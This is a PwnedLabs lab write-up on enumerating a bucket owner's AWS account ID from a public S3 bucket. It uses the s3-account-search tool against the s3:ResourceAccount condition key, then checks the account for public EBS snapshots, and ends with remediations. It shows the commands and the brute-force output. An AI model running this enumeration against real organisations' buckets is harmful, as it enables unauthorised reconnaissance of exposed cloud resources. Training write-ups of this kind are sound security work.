## Disclosure
This documentation is intended for educational purposes only. All activities were performed within a controlled, authorized environment provided by [PwnedLabs](https://pwnedlabs.io/). This write-up focuses strictly on the methodology, vulnerability analysis, and security remediation techniques. All sensitive identifiers, including credentials, tokens, and specific PII, have been redacted or generalized to comply with security best practices and the platform's Terms of Service. The intent of this content is to foster professional development and contribute to the cybersecurity community's knowledge base.

**The lab:** https://pwnedlabs.io/labs/identify-the-aws-account-id-from-a-public-s3-bucket

---
## Vulnerability Summary
The environment is vulnerable to **AWS Account ID enumeration** through a 
misconfigured, publicly accessible S3 bucket.

1. **Reconnaissance**: Public S3 buckets (often found via web inspection or 
   open-source intelligence) can be queried using automated tools to determine 
   the owner's AWS Account ID.
2. **Policy Exploitation**: The vulnerability leverages the `s3:ResourceAccount` 
   policy condition key. By attempting to access a bucket with a policy that 
   checks for a specific AWS Account ID, an attacker can iterate (brute-force) 
   through potential IDs using wildcards until a successful match is identified.
3. **Information Correlation**: Once the 12-digit AWS Account ID is discovered, 
   an attacker can use it to perform further reconnaissance, such as searching 
   for publicly exposed EBS snapshots, RDS snapshots, or AMIs belonging to 
   that specific account.
4. **Impact**: While an Account ID itself is not a secret, discovering it 
   enables targeted attacks, including the identification of publicly leaked 
   cloud resources and potential social engineering targeting.

---
## Walkthrough
1. Run an `nmap` scan
2. Inspect the webpage to find the bucket:
	1. `https://mega-big-tech.s3.amazonaws.com/images/...`
3. Add to `/etc/hosts`
4. Navigate to `https://mega-big-tech.s3.amazonaws.com`
5. It's possible to quickly brute force the AWS account ID an S3 bucket belongs to
	1. This script creates a policy that utilizes `S3:ResourceAccount` Policy Condition Key to evaluate whether to grant us access to an S3 bucket based on the AWS account that the ticket belongs to:  https://github.com/WeAreCloudar/s3-account-search/blob/main/s3_account_search/cli.py
6. For this lab, use `aws configure` to setup the lab with the provided user configurations. This user can assume a role, ensuring the script works:
```bash
aws configure
aws sts get-caller-identity
echo 'export PATH=$PATH:~/.local/bin' >> ~/.bashrc
source ~/.bashrc
```
7. Use `s3-account-search` command and the ARN of the role under our control and our target S3 bucket in the AWS account whose ID we want to enumerate.
	1. DOES NOT WORK IN `EXEGOL`. Use Ubuntu or Kali terminal
```r
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech

Starting search (this can take a while)
found: 1
found: 10
found: 107
found: 1075
found: 10751
found: 107513
found: 1075135
found: 10751350
found: 107513503
found: 1075135037
found: 10751350379
found: 107513503799
```

The AWS Account ID `107513503799` can be used to check for Public Snapshots (https://pwnedlabs.io/labs/loot-public-ebs-snapshots)! But, we must be in the same region. Use this command to find out the region:

```bash
curl -I https://mega-big-tech.s3.amazonaws.com
```

In the AWS Management Console search for the EC2 service
	`Left hand menu: Elastic Block Store > Snapshots > Public snapshots > "107513503799" > Enter/Run `

Bonus:
To list public snapshots, supply owner ID and region:
```bash
aws ec2 describe-snapshots --owner-ids 107513503799 --region us-east-1
```

---
## Remediations
1. **S3 Public Access Block**:
   - Enable **S3 Block Public Access** at both the bucket and account levels. 
     This is the most effective control to prevent unauthorized enumeration 
     and data exposure.
2. **Restrict Public Access**:
   - Audit bucket policies and ACLs to ensure they do not grant `s3:GetObject` 
     or `s3:ListBucket` permissions to `AllUsers` or `AuthenticatedUsers`.
3. **Minimize Public Exposure**:
   - Regularly scan your AWS environment for public EBS snapshots, RDS snapshots, 
     and AMIs. Ensure that no sensitive resources are unintentionally marked 
     as "public."
4. **Monitor Activity**:
   - Use `AWS CloudTrail` to monitor for unusual API activity. Although 
     account enumeration often happens from the attacker's own AWS account, 
     monitoring for cross-account access patterns can help identify 
     suspicious behavior.